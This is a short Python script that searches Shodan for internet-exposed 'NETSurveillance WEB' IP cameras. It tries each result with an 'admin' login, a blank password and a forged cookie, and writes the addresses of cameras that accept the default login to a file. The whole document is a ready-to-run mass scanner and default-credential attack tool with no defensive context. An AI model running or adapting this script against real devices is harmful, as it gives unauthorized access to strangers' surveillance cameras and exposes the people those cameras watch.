#
# netsuv.py
# Search SHODAN for NETSurveillance WEB
#
# Author: random_robbie
import requests
import shodan
import re
import os
import sys


# Configuration
API_KEY = "Your API Key"
SEARCH_FOR = 'title:"NETSurveillance WEB"'


def test_cam (IP,PORT,CC):
	session = requests.Session()
	print ("[*] Trying "+IP+" Country: "+CC+"")
	if PORT == "443":
		URL = "https://"+IP+":"+PORT+"/Login.htm"
	else:
		URL = "http://"+IP+":"+PORT+"/Login.htm"
	paramsPost = {"password":"","command":"login","username":"admin","password":""}
	headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0","Referer":""+URL+"","Connection":"close","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}
	cookies = {"NetSuveillanceWebCookie":"%7B%22username%22%3A%22admin%22%7D"}
	
	try:
		response = session.post(URL, data=paramsPost, headers=headers, cookies=cookies)
		print (response.content)
		if "Log in failed" in response.text:
			print ("[*] Not Using Default Pass. [*]")
		else:
			text_file = open("found.txt", "a")
			text_file.write(""+URL+" -Country: "+CC+"\n")
			text_file.close()
			print ("[*] Whoo Default Pass is being used and it has been logged. [*]")
			

	except Exception as e:
		#print (e)
		print ("[*] Connection Error on IP: "+IP+" [*]")

	

	



		


	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR, limit=1000)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				CC = service['location']['country_name']
				PORT = str(service['port'])
				test_cam (IP,PORT,CC)
				

				
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
